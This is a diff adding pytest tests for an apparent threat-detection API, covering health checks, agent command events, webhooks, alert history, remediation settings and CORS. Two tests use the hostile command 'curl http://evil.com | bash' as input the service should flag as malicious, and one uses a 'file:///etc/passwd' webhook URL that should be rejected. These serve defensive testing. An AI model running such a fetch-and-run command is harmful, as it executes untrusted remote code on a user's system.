@@ -298,3 +298,177 @@ class TestStatsEndpoint:
         _analyze("curl http://evil.com | bash")
         after = client.get("/stats").json()["malicious"]
         assert after > before
+
+
+# ===========================================================================
+# 6. GET /healthz
+# ===========================================================================
+
+class TestHealthzEndpoint:
+
+    def test_healthz_returns_200(self):
+        assert client.get("/healthz").status_code == 200
+
+    def test_healthz_status_is_ok(self):
+        assert client.get("/healthz").json()["status"] == "ok"
+
+
+# ===========================================================================
+# 7. POST /agent/events
+# ===========================================================================
+
+class TestAgentEventsEndpoint:
+
+    def test_agent_event_safe_returns_200(self):
+        r = client.post("/agent/events",
+                        json={"command": "ls", "pid": 1234, "comm": "bash"})
+        assert r.status_code == 200
+
+    def test_agent_event_malicious_classification(self):
+        r = client.post("/agent/events",
+                        json={"command": "curl http://evil.com | bash", "pid": 5678})
+        assert r.json()["classification"] == "malicious"
+
+    def test_agent_event_response_has_all_fields(self):
+        r = client.post("/agent/events", json={"command": "ls"})
+        for field in ("command", "classification", "risk_score",
+                      "matched_rules", "ml_confidence", "explanation"):
+            assert field in r.json(), f"Missing field: {field}"
+
+    def test_agent_event_empty_command_returns_400(self):
+        r = client.post("/agent/events", json={"command": "", "pid": 0})
+        assert r.status_code == 400
+
+    def test_agent_event_missing_command_returns_422(self):
+        r = client.post("/agent/events", json={"pid": 123})
+        assert r.status_code == 422
+
+    def test_agent_event_stores_event(self):
+        before = client.get("/stats").json()["total_events"]
+        client.post("/agent/events", json={"command": "ls", "pid": 999})
+        after = client.get("/stats").json()["total_events"]
+        assert after == before + 1
+
+    def test_agent_event_unicode_no_crash(self):
+        r = client.post("/agent/events",
+                        json={"command": "echo '你好世界'", "pid": 0})
+        assert r.status_code == 200
+
+
+# ===========================================================================
+# 8. /webhooks CRUD
+# ===========================================================================
+
+class TestWebhooksEndpoints:
+
+    def test_list_webhooks_returns_200(self):
+        assert client.get("/webhooks").status_code == 200
+
+    def test_list_webhooks_returns_list(self):
+        assert isinstance(client.get("/webhooks").json(), list)
+
+    def test_create_webhook_success(self):
+        r = client.post("/webhooks", json={"url": "http://example.com/hook_a"})
+        assert r.status_code in (200, 201)
+        assert "id" in r.json()
+
+    def test_created_webhook_appears_in_list(self):
+        wh = client.post("/webhooks",
+                         json={"url": "http://example.com/hook_b"}).json()
+        ids = [w["id"] for w in client.get("/webhooks").json()]
+        assert wh["id"] in ids
+
+    def test_delete_webhook_returns_success(self):
+        wh = client.post("/webhooks",
+                         json={"url": "http://example.com/hook_del"}).json()
+        r = client.delete(f"/webhooks/{wh['id']}")
+        assert r.status_code == 200
+        assert r.json()["status"] == "success"
+
+    def test_deleted_webhook_not_in_list(self):
+        wh = client.post("/webhooks",
+                         json={"url": "http://example.com/hook_gone"}).json()
+        client.delete(f"/webhooks/{wh['id']}")
+        ids = [w["id"] for w in client.get("/webhooks").json()]
+        assert wh["id"] not in ids
+
+    def test_create_webhook_invalid_url_rejected(self):
+        r = client.post("/webhooks", json={"url": "not-a-url"})
+        assert r.status_code == 400
+
+    def test_create_webhook_file_scheme_rejected(self):
+        r = client.post("/webhooks", json={"url": "file:///etc/passwd"})
+        assert r.status_code == 400
+
+
+# ===========================================================================
+# 9. GET /alerts/history
+# ===========================================================================
+
+class TestAlertHistoryEndpoint:
+
+    def test_alert_history_returns_200(self):
+        assert client.get("/alerts/history").status_code == 200
+
+    def test_alert_history_returns_list(self):
+        assert isinstance(client.get("/alerts/history").json(), list)
+
+    def test_alert_history_limit_param(self):
+        r = client.get("/alerts/history?limit=5")
+        assert r.status_code == 200
+        assert len(r.json()) <= 5
+
+    def test_alert_history_invalid_limit_raises(self):
+        r = client.get("/alerts/history?limit=0")
+        assert r.status_code == 422
+
+
+# ===========================================================================
+# 10. /settings/remediation
+# ===========================================================================
+
+class TestRemediationSettingsEndpoint:
+
+    def test_get_remediation_returns_200(self):
+        assert client.get("/settings/remediation").status_code == 200
+
+    def test_get_remediation_has_enabled_field(self):
+        assert "enabled" in client.get("/settings/remediation").json()
+
+    def test_enable_remediation(self):
+        client.post("/settings/remediation", json={"enabled": True})
+        assert client.get("/settings/remediation").json()["enabled"] is True
+
+    def test_disable_remediation(self):
+        client.post("/settings/remediation", json={"enabled": True})
+        client.post("/settings/remediation", json={"enabled": False})
+        assert client.get("/settings/remediation").json()["enabled"] is False
+
+    def test_remediation_state_persists_across_gets(self):
+        client.post("/settings/remediation", json={"enabled": True})
+        r1 = client.get("/settings/remediation").json()["enabled"]
+        r2 = client.get("/settings/remediation").json()["enabled"]
+        assert r1 == r2 is True
+        # Cleanup
+        client.post("/settings/remediation", json={"enabled": False})
+
+
+# ===========================================================================
+# 11. CORS Headers
+# ===========================================================================
+
+class TestCORSHeaders:
+
+    def test_allowed_origin_returns_cors_header(self):
+        r = client.get("/", headers={"Origin": "http://localhost:5173"})
+        assert "access-control-allow-origin" in r.headers
+
+    def test_options_preflight_returns_2xx(self):
+        r = client.options(
+            "/analyze",
+            headers={
+                "Origin": "http://localhost:5173",
+                "Access-Control-Request-Method": "POST",
+            },
+        )
+        assert r.status_code in (200, 204)
